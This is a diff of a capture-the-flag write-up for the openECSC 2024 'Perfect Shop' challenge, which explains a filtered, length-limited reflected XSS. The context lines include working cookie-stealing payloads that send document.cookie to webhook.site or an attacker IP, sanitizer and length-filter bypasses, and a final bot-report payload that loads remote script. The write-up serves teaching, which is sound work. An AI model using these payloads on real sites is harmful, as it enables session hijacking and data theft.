@@ -12,7 +12,6 @@ authors:
 - Tiziano-Caruana
 ---
 
-# Perfect Shop
 *March 2024 - filtered and size-limited reflected XSS*
 
 > "Do you like perfect things? Check out my new online shop!"
@@ -63,7 +62,9 @@ Starting from `const app = express();`, which confirms the use of [express](http
 *Body parameters* are the information that the website receives without passing through either [query parameters](https://www.branch.io/glossary/query-parameters/) (in `https://www.google.com/search?q=openECSC`, `q` is the query parameter and `openECSC` is its value), or through [headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers) including [cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Cookie). Typically, body parameters "pass" the information that the user enters in a form to the server, which handles it according to the programmer's intentions.
 
 Summary:
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/body_params.png" alt="Example of using various methods to send information to the server">
+
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/body_params.png" alt="Example of using various methods to send information to the server">
+
 As you can see, it's not mandatory for what the user sees and what is sent to the server to be the same. In this case, regarding the product, it's much easier for the server to work with the id rather than the name, which in any case would still uniquely represent the selected product. It's also fair to say that the programmer will access this information through the properties `req.body.id` and `req.body.message`.
 
 ##### Basics of XSS
@@ -72,7 +73,8 @@ Continuing, it's noticeable that [ejs](https://github.com/mde/ejs) is the chosen
 
 Moving forward, the application is instructed to use [perfect-express-sanitizer](https://github.com/pariazar/perfect-express-sanitizer) to avoid the risk of [XSS](https://en.wikipedia.org/wiki/Cross-site_scripting) (Cross-Site Scripting), except for the `/admin` endpoint. This type of attack is very straightforward: it occurs when a site can be manipulated to allow the execution of JavaScript code not explicitly written by the programmer. The most peculiar example is inserting a tag like this: `<script>alert(1)</script>`. If this tag is inserted in a search page that prints what the user has searched for without any sanitization, the tag will be interpreted and the script executed:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/vid/basicXSSexample.gif" alt="Basic XSS example">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/vid/basicXSSexample.gif" alt="Basic XSS example">
+
 This attack is "temporary", only valid for the victim request, and it's called *reflected XSS*. If the payload/attack vector (in this case `<script>alert(1)</script>`) had been somehow stored by the application, like, for example, in a comment, the attack would have been a *stored XSS*.
 
 ##### Handling Request and Response in Express
@@ -90,7 +92,8 @@ Although the "playing field" turned out to be less extensive than expected, ther
 #### / (homepage)
 This is the first screen displayed when entering the site, or when a GET request is made to the `/` endpoint:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/home.png" alt="Homepage">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/home.png" alt="Homepage">
+
 The related code is as follows:
 ```js
 app.get('/', (req, res) => {
@@ -107,7 +110,8 @@ In this case, no filter is applied to the `products` variable, so all products w
 #### /product/:id
 The two colons preceding `id` indicate that it is a value that can be arbitrarily chosen by the user. One can imagine that there are various products, and this is a way to allow for a [route](https://expressjs.com/en/starter/basic-routing.html) for each of them without explicitly specifying one for each.
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/product.png" alt="Product detail page">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/product.png" alt="Product detail page">
+
 ```js
 app.get('/product/:id', (req, res) => {
     const id = parseInt(req.params.id);
@@ -128,7 +132,8 @@ If the id is not recognized (the product does not exist), a `404` "not found" er
 #### /search
 A classic search functionality that filters results based on the product name.
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/search.png" alt="Example of search functionality">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/search.png" alt="Example of search functionality">
+
 ```js
 app.get('/search', (req, res) => {
     let query = req.query.q || '';
@@ -153,7 +158,8 @@ This would be very useful for a simple reflected XSS, but the length filter and 
 #### /admin
 An admin panel with a list of all available products.
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/admin.png" alt="Admin panel overview">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/admin.png" alt="Admin panel overview">
+
 ```js
 app.get('/admin', (req, res) => {
     res.render('admin', { products: products });
@@ -166,7 +172,8 @@ The XSS filter on this route is disabled, yet there are no traces of HTML tags o
 #### GET
 Product editing page, part of the admin panel.
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/edit_product.png" alt="Product editing page overview">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/edit_product.png" alt="Product editing page overview">
+
 ```js
 app.get('/admin/:id', (req, res) => {
     const id = parseInt(req.params.id);
@@ -228,7 +235,8 @@ For completeness: the id passed by the user is parsed into `id`. A check is made
 ##### GET
 Simply renders the report page.
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/report.png" alt="Report page">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/report.png" alt="Report page">
+
 ```js
 app.get('/report', (req, res) => {
     res.render('report', { products: products });
@@ -249,10 +257,10 @@ app.post('/report', (req, res) => {
         return;
     }
 
-    fetch(`http://${HEADLESS_HOST}/`, { 
-        method: 'POST', 
+    fetch(`http://${HEADLESS_HOST}/`, {
+        method: 'POST',
         headers: { 'Content-Type': 'application/json', 'X-Auth': HEADLESS_AUTH },
-        body: JSON.stringify({ 
+        body: JSON.stringify({
             actions: [
                 {
                     type: 'request',
@@ -346,7 +354,8 @@ The ID is parsed using the [parseInt()](https://developer.mozilla.org/en-US/docs
 
 *The console of major browsers' DevTools is a great friend in this type of challenge. It can usually be accessed with fn+F12 > console*
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/parseInt.png" alt="Example of parseInt function behavior">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/parseInt.png" alt="Example of parseInt function behavior">
+
 Simply put, the rest of the string is brutally truncated. The same goes if there are digits before, then characters, and then more digits. From the first encountered character onwards, everything is completely ignored by parseInt.
 
 #### Endpoint inheritance???? (It's not a real thing don't look it up)
@@ -412,13 +421,15 @@ I tend to overlook various things during the exploration of a challenge, so havi
 
 In the `server.js` file, I edited the following lines:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/XSSfilterOFF.png" alt="Disabling XSS filter">
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/length_filterOFF.png" alt="Disabling input length filter">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/XSSfilterOFF.png" alt="Disabling XSS filter">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/length_filterOFF.png" alt="Disabling input length filter">
+
 I decided to maintain decency on the length filter to avoid ending up with comically long payloads.
 
 At this point, all that's left is to build and deploy the challenge and see how it goes.
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/vid/FirstXSS.gif" alt="Example of injecting a simple XSS with filters disabled in the challenge">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/vid/FirstXSS.gif" alt="Example of injecting a simple XSS with filters disabled in the challenge">
+
 As expected, with the filters disabled, we can successfully exploit it. And steal a cookie?
 
 ##### Cookie stealing and webhooks
@@ -436,7 +447,8 @@ Also, you need to append the cookies as query parameters (for webhook and person
 
 Executing the payload above by sending it to the search page yields the following result on webhook.site:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/FirstWebhook.png" alt="Example webhook result">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/FirstWebhook.png" alt="Example webhook result">
+
 There are the cookies!
 
 #### Second step: Cookie stealing on the bot
@@ -446,34 +458,42 @@ Perhaps it would have made more sense to find a valid payload with the character
 
 But first, let's delve into the bot's operation and the related report page.
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/NetworkReport.png" alt="Inspection of a POST request to the reporting endpoint">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/NetworkReport.png" alt="Inspection of a POST request to the reporting endpoint">
+
 All fine, here's the ID and the message. Checking the logs, which appear on the terminal from which the `docker compose` was launched, it's also possible to verify which page was visited by the bot:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/BotVisitsProduct.png" alt="Example of logs indicating that the bot visited the page related to the reported product">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/BotVisitsProduct.png" alt="Example of logs indicating that the bot visited the page related to the reported product">
+
 And if, for no reason, you wanted to send an ID different from those prefixed by the `select` proposed by the developer? In this case, it's very useful to modify the request with Burp Suite or similar tools. Unfortunately, I don't have the time to show you how to set up Burp on your trusted browser ([this](https://www.youtube.com/watch?v=Vn_Zst6BMGo) tutorial may be helpful) or to show you the process to solve the challenge without using similar tools.
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/vid/BurpIDmodif.gif" alt="Modifying the product ID with Burp">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/vid/BurpIDmodif.gif" alt="Modifying the product ID with Burp">
+
 What I did was change the value of `id` from `1` to `1/../../search?q=Incredible` before it was sent to the server and consequently to the bot. To clarify, I would have achieved the same result if I had done this:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/HTMLmodif.png" alt="Modifying the product ID from client-side HTML">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/HTMLmodif.png" alt="Modifying the product ID from client-side HTML">
+
 Checking the logs, it can be seen that the bot is redirected to `search?q=Incredible`:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/BotFallsForIt.png" alt="Bot log visiting the search page with the value entered by the reporter">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/BotFallsForIt.png" alt="Bot log visiting the search page with the value entered by the reporter">
+
 A brief check of the site's route structure confirms this.
 
 Now all that's left is to try the payload that worked before to exfiltrate our cookie on the bot. Trying the payload `<script>window.location="https://webhook.site/[REDACTED]?c="+document.cookie</script>`, you would notice that the complete URL being visited is `http://localhost:3000/search?q=<script>window.location="https://webhook.site/[REDACTED]?c="+document.cookie</script>` or `http://perfectshop.challs.open.ecsc2024.it/search?q=<script>window.location="https://webhook.site/[REDACTED]?c="+document.cookie</script>` depending on whether you are testing the challenge locally or on the competition server.
 
 This means that the same request must be made by the bot, which means making the same modification made before, combining it with the exploit already used:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/WePwnNoFilter.png" alt="Example of successful attack without filter">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/WePwnNoFilter.png" alt="Example of successful attack without filter">
+
 Of course, I'm not URL-encoding the payload here just to make it easier to understand what's happening, but you viewers at home must remember to URL-encode properly <3 (on Burp, CTRL+U highlighting the text to be URL-encoded):
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/vid/UrlEncoding4profit.gif" alt="Example of URL-encoded payload">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/vid/UrlEncoding4profit.gif" alt="Example of URL-encoded payload">
+
 First, URL-encode for the query parameter value that the bot will send to the search endpoint, and then URL-encode for the entire payload that is about to be sent to the bot.
 
 Sending this payload, you'll receive a request on the webhook with the test flag set in the config:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/FlagNoFilter.png" alt="Test flag sent on the webhook">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/FlagNoFilter.png" alt="Test flag sent on the webhook">
+
 #### Third step: Cookie stealing on the bot with the sanitizer active
 On line 16, let's modify the sanitizer again to set it as in the original application, then rebuild everything:
 
@@ -497,7 +517,8 @@ Once the URL encoding is correctly applied, the result should be this: `id=1/../
 
 Since it's not excluded by the filter, it will be necessary to bypass the filter also in the report endpoint. To do this, simply add any query parameter with the value `/admin` or `'/admin'` in the report URL. In Burp Suite, the final payload will be:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/PayloadNoLenght.png" alt="Final payload without length filter">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/PayloadNoLenght.png" alt="Final payload without length filter">
+
 By doing this, you should again get the flag on the webhook as before. Now there's one last obstacle to overcome...
 
 #### Last Step: Length Filter Bypass
@@ -505,13 +526,13 @@ This step didn't require any rocket science. Let's say I simply aimed to find th
 
 ##### What I Tried During the Competition
 - First of all, I tried several times to exploit [unicode normalization](https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html), with a payload like [`<script src=//ﬀﬀ.pw>`](https://jlajara.gitlab.io/XSS_20_characters), but it seemed useless to me because it wouldn't have allowed me to exfiltrate the cookie (which is absolutely not true) since I wouldn't have been able to append the contents of `document.cookie`, as the use of `src` alone wouldn't have allowed me to execute JavaScript code;
-  
+
 - I tried using `onerror` like this: `<img src/onerror=this.src='https://[IP]/'+document.cookie>`, but it still went beyond the allowed 50 characters;
-  
+
 - I found a way to not specify the protocol, resulting in `<img src/onerror=this.src='//[IP]/'+document.cookie>`. Still way too long.
-  
+
 - I tried changing the tag, first with the script tag `<script>location='//[IP]/'+document.cookie`, where `location` is a shortcut to access `window location`, but I realized that the payload wouldn't work unless I closed the tag.
-  
+
 - Again, this time with `<svg onload=location='//[IP]/'+document.cookie>`, but with the IP, I would have still exceeded the character limit by a few.
 
 After trying and retrying, convincing myself more and more that I wasn't using the right approach, and scrutinizing the challenge files over and over again, including the templates that I considered completely safe, my eyes fell on the commented Bootstrap CDN.
@@ -537,15 +558,17 @@ To expose your files to the rest of the internet, you don't need to physically o
 
 Firstly, you need to get your local IP, which on Linux you can obtain by running the command `ifconfig`:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/ifconfig.png" alt="Example of finding local IP with ifconfig">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/ifconfig.png" alt="Example of finding local IP with ifconfig">
+
 You will likely see an IP starting with `192.`; here, I tested it on my university's MAN.
 
 Then, to expose the file containing the payload to the local network, you can use the Python command `python3 -m http.server [PORT]`. This command sets up a simple HTTP server that exposes all files in the folder and its subfolders where the command was executed. This means that at the URL `http://[IP]:[PORT]/x.js`, if everything is set up correctly, you should find the payload.
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/SimpleHTTPserver.png" alt="Example of a simple HTTP server">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/SimpleHTTPserver.png" alt="Example of a simple HTTP server">
+
 Opening it, you should be able to see the payload, which is not being executed. Do not be afraid; when this is included in the script tag, it will be executed as necessary.
 
-As all good kids know, it's the router that communicates with the fantastic world of the internet, not our device directly, which only receives and sends information via the router. To find out what your external IP address is, you can use an online service like [whatismyip.com](https://www.whatismyip.com/). 
+As all good kids know, it's the router that communicates with the fantastic world of the internet, not our device directly, which only receives and sends information via the router. To find out what your external IP address is, you can use an online service like [whatismyip.com](https://www.whatismyip.com/).
 
 At this point, we have almost everything: we know the IP address where the file to be included in the script tag passed to the bot will be located (i.e., the IP we just found), and we know the port on our device where our files are exposed (after all, we chose it).
 
@@ -553,7 +576,8 @@ But there's one step missing: the router is reachable from the outside world, bu
 
 [Port forwarding](https://en.wikipedia.org/wiki/Port_forwarding) allows us to do this. The procedure for enabling it varies greatly depending on the router manufacturer.
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/PortForwarding.png" alt="Example of port forwarding">
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/PortForwarding.png" alt="Example of port forwarding">
+
 As for the protocol, it's important to select TCP/UDP or similar if available; otherwise, it's better to create a port forwarding table for each protocol.
 
 The WAN port is the port that will be reachable from the outside, while the LAN port is the port that will receive packets from the outside. Essentially, it's the one chosen when the HTTP server was set up in Python. To avoid errors, I would recommend using the same LAN and WAN port (internal and external) where possible.
@@ -573,8 +597,10 @@ To recap:
 - The code present on `x.js` is `window.location = "https://webhook.site/[REDACTED]?c=" + document.cookie;`.
 - All that's left is to send the bot a report like this:
 
-<img class="img-responsive" src="{{ site-url }}/assets/openecsc2024/Perfect-Shop/img/FinalBurp.png" alt="Final Payload in Burp">
-`id=1/../../search%3flol%3d"/admin"%26q%3d<script%2bsrc%253d"http%253a//10.10.201.233%253a1337/x.js"></script>&message=/admin`, which decodes to `id=1/../../search?lol="/admin"&q=<script src="http://10.10.201.233:1337/x.js"></script>&message=/admin`
+<img class="img-responsive" src="/openecsc2024/Perfect-Shop/img/FinalBurp.png" alt="Final Payload in Burp">
+
+`id=1/../../search%3flol%3d"/admin"%26q%3d<script%2bsrc%253d"http%253a//10.10.201.233%253a1337/x.js"></script>&message=/admin`, which decodes to
+`id=1/../../search?lol="/admin"&q=<script src="http://10.10.201.233:1337/x.js"></script>&message=/admin`
 
 To anyone who managed to read this far, thank you from the bottom of my heart ❤️
 
